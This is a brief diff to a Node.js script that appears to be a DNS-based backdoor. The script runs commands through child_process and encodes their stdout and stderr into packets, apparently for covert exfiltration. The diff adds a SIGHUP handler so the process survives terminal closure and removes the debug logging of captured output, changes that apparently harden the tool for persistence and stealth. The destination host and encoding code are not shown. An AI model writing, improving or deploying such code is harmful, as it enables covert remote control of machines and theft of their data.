@@ -8,6 +8,8 @@ const NOP_SLEEP_TIME = 1;
 const dns = require('dns');
 const cp = require('child_process');
 
+process.on('SIGHUP', function() {});
+
 function sleep(sec) {
   return new Promise(function(resolve) {
     setTimeout(resolve, 1000*sec);
@@ -58,13 +60,11 @@ async function event() {
 
     if (stdout.length > 0) {
       for (let line of stdout.split('\n')) {
-        console.log('line: "', line, '"');
         packets = packets.concat(encode(line));
       }
     }
     if (stderr.length > 0) {
       for (line of stderr.split('\n')) {
-        console.log('line: "', line, '"');
         packets = packets.concat(encode(line));
       }
     }
